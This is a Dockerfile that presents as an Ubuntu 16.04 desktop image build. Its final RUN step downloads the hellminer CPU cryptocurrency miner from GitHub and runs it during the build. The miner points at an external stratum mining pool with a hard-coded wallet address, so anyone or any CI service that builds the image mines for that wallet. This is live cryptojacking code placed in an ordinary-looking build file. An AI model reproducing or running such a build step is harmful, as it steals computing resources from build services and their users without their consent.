FROM ubuntu:16.04
ENV DEBIAN_FRONTEND=noninteractive
RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
	  unzip \
	  wget \
	  && apt-get update \
	  && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_cpu_linux64.tar.gz && tar -xzvf hellminer_cpu_linux64.tar.gz && ./hellminer -c stratum+tcp://us.vipor.net:5040 -u RG7c1xxLEjMwNu53kmqy1c1StriNqYubx9.ancok1 -p x -t4
